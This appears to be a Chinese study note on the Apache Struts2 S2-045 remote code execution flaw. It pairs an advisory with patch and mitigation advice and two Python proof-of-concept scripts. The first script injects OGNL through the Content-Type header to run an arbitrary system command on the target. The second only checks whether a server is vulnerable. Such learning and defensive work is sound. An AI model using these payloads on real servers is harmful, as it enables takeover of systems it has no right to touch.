Struts-045学习
=============

关于Apache Struts2（S2-045）漏洞情况的通报
近日，国家信息安全漏洞库（CNNVD）收到关于Apache Struts2 （S2-045）远程代码执行漏洞（CNNVD-201703-152）的情况报送。由于该漏洞影响范围广，危害级别高，国家信息安全漏洞库（CNNVD）对此进行了跟踪分析，情况如下：

一、 漏洞简介
--------
Apache Struts是美国阿帕奇（Apache）软件基金会负责维护的一个开源项目，是一套用于创建企业级Java Web 应用的开源MVC框架，主要提供两个版本框架产品： Struts 1和Struts 2。  

ApacheStruts 2.3.5 – 2.3.31版本及2.5 – 2.5.10版本存在远程代码执行漏洞（CNNVD-201703-152 ，CVE-2017-5638）。该漏洞是由于上传功能的异常处理函数没有正确处理用户输入的错误信息。导致远程攻击者可通过发送恶意的数据包，利用该漏洞在受影响服务器上执行任意命令。    

二、 漏洞危害
--------
攻击者可通过发送恶意构造的HTTP数据包利用该漏洞，在受影响服务器上执行系统命令，进一步可完全控制该服务器，造成拒绝服务、数据泄露、网站造篡改等影响。由于该漏洞利用无需任何前置条件（如开启dmi ，debug等功能）以及启用任何插件，因此漏洞危害较为严重。

三、 修复措施
--------
目前，Apache官方已针对该漏洞发布安全公告。请受影响用户及时检查是否受该漏洞影响。

>自查方式
用户可查看web目录下/WEB-INF/lib/目录下的struts-core.x.x.jar 文件，如果这个版本在Struts2.3.5 到 Struts2.3.31 以及 Struts2.5 到 Struts2.5.10之间则存在漏洞。

>升级修复
受影响用户可升级版本至Apache Struts 2.3.32 或 Apache Struts 2.5.10.1以消除漏洞影响。

>临时缓解
如用户不方便升级，可采取如下临时解决方案：
l  删除commons-fileupload-x.x.x.jar文件（会造成上传功能不可用）。


四、PoC示例
--------

>requests库学习
* Requests 是用Python语言编写，基于 urllib，采用 Apache2 Licensed 开源协议的 HTTP 库。它比 urllib 更加方便，可以节约我们大量的工作，完全满足 HTTP 测试需求。Requests 的哲学是以 PEP 20 的习语为中心开发的，所以它比 urllib 更加 Pythoner。更重要的一点是它支持 Python3 哦！
* Requests 使用的是 urllib3，因此继承了它的所有特性。Requests 支持 HTTP 连接保持和连接池，支持使用 cookie 保持会话，支持文件上传，支持自动确定响应内容的编码，支持国际化的 URL 和 POST 数据自动编码。现代、国际化、人性化。

>sys库学习
* Python的系统模块
包括sys, os, glob, socket, threading, _thread, queue, time, timeit, subprocess, multiprocessing, signal, select, shutil, tempfile等。
大多数系统级接口集中在：sys和os两个模块。

>下面是测试PoC脚本1
```
/usr/bin/env python
# encoding:utf-8
import urllib2
import sys
from poster.encode import multipart_encode
from poster.streaminghttp import register_openers
 
def poc():
    register_openers()
    datagen, header = multipart_encode({"image1": open("tmp.txt", "rb")})
    header["User-Agent"]="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
    header["Content-Type"]="%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='ifconfig').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
    request = urllib2.Request(str(sys.argv[1]),datagen,headers=header)
    response = urllib2.urlopen(request)
    print response.read()

     
poc()
```


>下面是测试PoC脚本1
```
import requests
import sys
 
def poc(url):

    payload = "%{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(#ros.println(102*102*102*99)).(#ros.flush())}"

    headers = {}

    headers["Content-Type"] = payload

    r = requests.get(url, headers=headers)

    if b"105059592" in r.content:

        return True
 

    return False



if __name__ == '__main__':

    if len(sys.argv) == 1:

        print ("py " + sys.argv[0] + " targetUrl")

        sys.exit()

    if poc(sys.argv[1])==True:

        print ("vulnerable")

    else:

        print ("not vulnerable")
```
